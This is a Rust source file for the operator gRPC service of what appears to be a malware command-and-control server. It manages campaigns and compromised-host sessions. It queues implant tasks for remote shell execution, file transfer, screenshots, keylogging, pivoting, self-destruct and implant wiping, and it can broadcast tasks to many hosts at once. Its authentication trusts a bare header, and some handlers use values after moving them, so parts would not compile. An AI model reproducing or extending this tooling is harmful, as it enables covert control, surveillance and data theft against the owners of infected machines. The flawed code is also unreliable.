use tonic::{Request, Response, Status};
use crate::operator::OperatorApi;
use crate::database::repository::{CampaignRepository, SessionRepository, TaskRepository};

pub mod proto {
    tonic::include_proto!("oblivion.operator");
}

use proto::{
    operator_server::{Operator, OperatorServer},
    *,
};

#[tonic::async_trait]
impl Operator for OperatorApi {
    // Campaign Management
    async fn create_campaign(
        &self,
        request: Request<CreateCampaignRequest>,
    ) -> Result<Response<Campaign>, Status> {
        let req = request.into_inner();
        let operator_id = self.authenticate(&request).await?;
        
        let campaign = self.campaign_manager
            .create_campaign(
                req.name,
                req.description,
                operator_id,
                req.metadata.map(|m| serde_json::to_value(&m.fields).unwrap_or_default()),
            )
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        
        Ok(Response::new(campaign.into()))
    }
    
    async fn list_campaigns(
        &self,
        request: Request<ListCampaignsRequest>,
    ) -> Result<Response<ListCampaignsResponse>, Status> {
        let operator_id = self.authenticate(&request).await?;
        
        let campaigns = self.campaign_manager
            .list_operator_campaigns(&operator_id)
            .await;
        
        Ok(Response::new(ListCampaignsResponse {
            campaigns: campaigns.into_iter().map(|c| c.into()).collect(),
        }))
    }
    
    async fn get_campaign(
        &self,
        request: Request<GetCampaignRequest>,
    ) -> Result<Response<CampaignDetails>, Status> {
        let operator_id = self.authenticate(&request).await?;
        let req = request.into_inner();
        
        let (campaign, sessions) = self.campaign_manager
            .get_campaign_details(&req.campaign_id)
            .await
            .map_err(|e| Status::not_found(e.to_string()))?;
        
        // Get statistics
        let stats = self.campaign_manager
            .get_statistics(&req.campaign_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        
        Ok(Response::new(CampaignDetails {
            campaign: Some(campaign.into()),
            sessions: sessions.into_iter().map(|s| s.into()).collect(),
            statistics: Some(stats.into()),
        }))
    }
    
    async fn control_campaign(
        &self,
        request: Request<ControlCampaignRequest>,
    ) -> Result<Response<ControlCampaignResponse>, Status> {
        let operator_id = self.authenticate(&request).await?;
        let req = request.into_inner();
        
        let success = match req.action() {
            CampaignAction::Start => {
                self.campaign_manager
                    .start_campaign(&req.campaign_id, &operator_id)
                    .await
                    .is_ok()
            }
            CampaignAction::Pause => {
                self.campaign_manager
                    .pause_campaign(&req.campaign_id, &operator_id)
                    .await
                    .is_ok()
            }
            CampaignAction::Close => {
                self.campaign_manager
                    .close_campaign(&req.campaign_id, &operator_id)
                    .await
                    .is_ok()
            }
            CampaignAction::Archive => {
                self.campaign_manager
                    .archive_campaign(&req.campaign_id, &operator_id)
                    .await
                    .is_ok()
            }
            _ => false,
        };
        
        Ok(Response::new(ControlCampaignResponse { success }))
    }
    
    // Session Management
    async fn list_sessions(
        &self,
        request: Request<ListSessionsRequest>,
    ) -> Result<Response<ListSessionsResponse>, Status> {
        let operator_id = self.authenticate(&request).await?;
        let req = request.into_inner();
        
        let sessions = self.session_manager
            .get_sessions_by_campaign(&req.campaign_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        
        Ok(Response::new(ListSessionsResponse {
            sessions: sessions.into_iter().map(|s| s.into()).collect(),
        }))
    }
    
    async fn get_session(
        &self,
        request: Request<GetSessionRequest>,
    ) -> Result<Response<SessionDetails>, Status> {
        let operator_id = self.authenticate(&request).await?;
        let req = request.into_inner();
        
        let session = self.session_manager
            .get_session(&req.session_id)
            .await
            .ok_or_else(|| Status::not_found("Session not found"))?;
        
        // Get tasks for this session
        let tasks = self.task_engine
            .get_session_tasks(&req.session_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        
        Ok(Response::new(SessionDetails {
            session: Some(session.into()),
            recent_tasks: tasks.into_iter().map(|t| t.into()).collect(),
        }))
    }
    
    async fn terminate_session(
        &self,
        request: Request<TerminateSessionRequest>,
    ) -> Result<Response<TerminateSessionResponse>, Status> {
        let operator_id = self.authenticate(&request).await?;
        let req = request.into_inner();
        
        self.session_manager
            .terminate_session(&req.session_id, req.wipe_implant)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        
        self.audit_logger
            .log(
                &operator_id,
                "terminate_session",
                Some(&req.session_id),
                None,
                Some(&format!("wipe={}", req.wipe_implant)),
                None,
                true,
            )
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        
        Ok(Response::new(TerminateSessionResponse { success: true }))
    }
    
    // Task Management
    async fn create_task(
        &self,
        request: Request<CreateTaskRequest>,
    ) -> Result<Response<CreateTaskResponse>, Status> {
        let operator_id = self.authenticate(&request).await?;
        let req = request.into_inner();
        
        let task_type = match req.task_type() {
            TaskType::ShellExec => crate::tasks::TaskType::ShellExec,
            TaskType::FileUpload => crate::tasks::TaskType::FileUpload,
            TaskType::FileDownload => crate::tasks::TaskType::FileDownload,
            TaskType::ProcessList => crate::tasks::TaskType::ProcessList,
            TaskType::Screenshot => crate::tasks::TaskType::Screenshot,
            TaskType::KeylogStart => crate::tasks::TaskType::KeylogStart,
            TaskType::KeylogStop => crate::tasks::TaskType::KeylogStop,
            TaskType::PivotSetup => crate::tasks::TaskType::PivotSetup,
            TaskType::SelfDestruct => crate::tasks::TaskType::SelfDestruct,
        };
        
        let task_id = self.task_engine
            .queue_task(
                &req.session_id,
                &req.campaign_id,
                task_type,
                req.payload,
                &operator_id,
                req.timeout_seconds,
            )
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        
        Ok(Response::new(CreateTaskResponse {
            task_id,
            estimated_wait_seconds: 60, // Could calculate based on heartbeat
        }))
    }
    
    async fn create_broadcast_task(
        &self,
        request: Request<CreateBroadcastTaskRequest>,
    ) -> Result<Response<CreateBroadcastTaskResponse>, Status> {
        let operator_id = self.authenticate(&request).await?;
        let req = request.into_inner();
        
        let task_type = match req.task_type() {
            TaskType::ShellExec => crate::tasks::TaskType::ShellExec,
            TaskType::FileUpload => crate::tasks::TaskType::FileUpload,
            TaskType::FileDownload => crate::tasks::TaskType::FileDownload,
            TaskType::ProcessList => crate::tasks::TaskType::ProcessList,
            TaskType::Screenshot => crate::tasks::TaskType::Screenshot,
            TaskType::KeylogStart => crate::tasks::TaskType::KeylogStart,
            TaskType::KeylogStop => crate::tasks::TaskType::KeylogStop,
            TaskType::PivotSetup => crate::tasks::TaskType::PivotSetup,
            TaskType::SelfDestruct => crate::tasks::TaskType::SelfDestruct,
        };
        
        let task_ids = self.task_engine
            .broadcast_task(
                req.session_ids,
                &req.campaign_id,
                task_type,
                req.payload,
                &operator_id,
                req.timeout_seconds,
            )
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        
        Ok(Response::new(CreateBroadcastTaskResponse {
            task_ids,
            target_count: req.session_ids.len() as u32,
        }))
    }
    
    async fn get_task_result(
        &self,
        request: Request<GetTaskResultRequest>,
    ) -> Result<Response<TaskResult>, Status> {
        let _operator_id = self.authenticate(&request).await?;
        let req = request.into_inner();
        
        let (status, result) = self.task_engine
            .get_task_status(req.task_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?
            .ok_or_else(|| Status::not_found("Task not found"))?;
        
        Ok(Response::new(TaskResult {
            task_id: req.task_id,
            status: match status {
                crate::database::models::TaskStatus::Pending => TaskStatus::Pending as i32,
                crate::database::models::TaskStatus::Assigned => TaskStatus::InProgress as i32,
                crate::database::models::TaskStatus::InProgress => TaskStatus::InProgress as i32,
                crate::database::models::TaskStatus::Completed => TaskStatus::Completed as i32,
                crate::database::models::TaskStatus::Failed => TaskStatus::Failed as i32,
                crate::database::models::TaskStatus::Timeout => TaskStatus::Timeout as i32,
            },
            output: result.and_then(|r| r.result.map(|res| match res {
                crate::protocol::messages::proto::task_result::Result::Output(data) => data,
                _ => vec![],
            })),
            error: result.and_then(|r| r.result.map(|res| match res {
                crate::protocol::messages::proto::task_result::Result::Error(msg) => msg,
                _ => String::new(),
            })),
            completed_at: None, // Would populate from database
        }))
    }
    
    async fn cancel_task(
        &self,
        request: Request<CancelTaskRequest>,
    ) -> Result<Response<CancelTaskResponse>, Status> {
        let operator_id = self.authenticate(&request).await?;
        let req = request.into_inner();
        
        let cancelled = self.task_engine
            .cancel_task(req.task_id, &operator_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?;
        
        Ok(Response::new(CancelTaskResponse { cancelled }))
    }
    
    // Streaming for real-time updates
    type SubscribeEventsStream = tokio::sync::mpsc::Receiver<Result<Event, Status>>;
    
    async fn subscribe_events(
        &self,
        request: Request<SubscribeEventsRequest>,
    ) -> Result<Response<Self::SubscribeEventsStream>, Status> {
        let operator_id = self.authenticate(&request).await?;
        let req = request.into_inner();
        
        let (tx, rx) = tokio::sync::mpsc::channel(100);
        
        // Register for task notifications
        let (notify_tx, mut notify_rx) = tokio::sync::mpsc::channel(100);
        self.task_engine
            .register_operator_notifier(operator_id.clone(), notify_tx)
            .await;
        
        // Spawn task to forward events
        let campaign_manager = self.campaign_manager.clone();
        let session_manager = self.session_manager.clone();
        
        tokio::spawn(async move {
            // Send initial state
            if let Ok((campaign, sessions)) = campaign_manager
                .get_campaign_details(&req.campaign_id)
                .await 
            {
                let _ = tx.send(Ok(Event {
                    event_type: EventType::CampaignUpdate as i32,
                    campaign: Some(campaign.into()),
                    sessions: sessions.into_iter().map(|s| s.into()).collect(),
                    task: None,
                    timestamp: chrono::Utc::now().to_rfc3339(),
                })).await;
            }
            
            // Forward notifications
            while let Some(notification) = notify_rx.recv().await {
                let event = Event {
                    event_type: EventType::TaskComplete as i32,
                    campaign: None,
                    sessions: vec![],
                    task: Some(TaskBrief {
                        task_id: notification.task_id,
                        session_id: notification.session_id,
                        status: notification.status as i32,
                    }),
                    timestamp: chrono::Utc::now().to_rfc3339(),
                };
                
                if tx.send(Ok(event)).await.is_err() {
                    break;
                }
            }
        });
        
        Ok(Response::new(rx))
    }
    
    // Server Statistics
    async fn get_server_stats(
        &self,
        request: Request<GetServerStatsRequest>,
    ) -> Result<Response<ServerStats>, Status> {
        let _operator_id = self.authenticate(&request).await?;
        
        let task_stats = self.task_engine.get_statistics().await;
        
        Ok(Response::new(ServerStats {
            active_sessions: self.session_manager.active_session_count(),
            total_campaigns: self.campaign_manager.list_operator_campaigns("").await.len() as u32,
            pending_tasks: task_stats.total_pending_tasks as u32,
            active_tasks: task_stats.active_tasks as u32,
            uptime_seconds: 0, // Would track actual uptime
            version: env!("CARGO_PKG_VERSION").to_string(),
        }))
    }
}

impl OperatorApi {
    async fn authenticate<T>(&self, request: &Request<T>) -> Result<String, Status> {
        // Extract from metadata or TLS certificate
        // For now, simplified - would check client cert or JWT
        request.metadata()
            .get("operator-id")
            .and_then(|v| v.to_str().ok())
            .map(|s| s.to_string())
            .ok_or_else(|| Status::unauthenticated("Missing operator credentials"))
    }
}

// Conversion implementations
impl From<crate::database::models::Campaign> for Campaign {
    fn from(c: crate::database::models::Campaign) -> Self {
        Self {
            id: c.id,
            name: c.name,
            description: c.description.unwrap_or_default(),
            operator_id: c.operator_id,
            status: match c.status {
                crate::database::models::CampaignStatus::Planning => CampaignStatus::Planning as i32,
                crate::database::models::CampaignStatus::Active => CampaignStatus::Active as i32,
                crate::database::models::CampaignStatus::Paused => CampaignStatus::Paused as i32,
                crate::database::models::CampaignStatus::Closing => CampaignStatus::Closing as i32,
                crate::database::models::CampaignStatus::Archived => CampaignStatus::Archived as i32,
            },
            created_at: c.created_at.to_rfc3339(),
            started_at: c.started_at.map(|t| t.to_rfc3339()),
            ended_at: c.ended_at.map(|t| t.to_rfc3339()),
        }
    }
}

impl From<crate::database::models::Session> for Session {
    fn from(s: crate::database::models::Session) -> Self {
        Self {
            id: s.id,
            campaign_id: s.campaign_id,
            hostname: s.hostname,
            username: s.username.unwrap_or_default(),
            os_version: s.os_version.unwrap_or_default(),
            process_id: s.process_id.unwrap_or_default() as u32,
            first_seen: s.first_seen.to_rfc3339(),
            last_seen: s.last_seen.to_rfc3339(),
            status: match s.status {
                crate::database::models::SessionStatus::Active => SessionStatus::Active as i32,
                crate::database::models::SessionStatus::Idle => SessionStatus::Idle as i32,
                crate::database::models::SessionStatus::Stale => SessionStatus::Stale as i32,
                crate::database::models::SessionStatus::Terminated => SessionStatus::Terminated as i32,
            },
        }
    }
}

impl From<crate::campaign::manager::CampaignStatistics> for CampaignStatistics {
    fn from(s: crate::campaign::manager::CampaignStatistics) -> Self {
        Self {
            total_sessions: s.total_sessions as u32,
            active_sessions: s.active_sessions as u32,
            stale_sessions: s.stale_sessions as u32,
            terminated_sessions: s.terminated_sessions as u32,
            duration_seconds: s.duration_secs,
        }
    }
}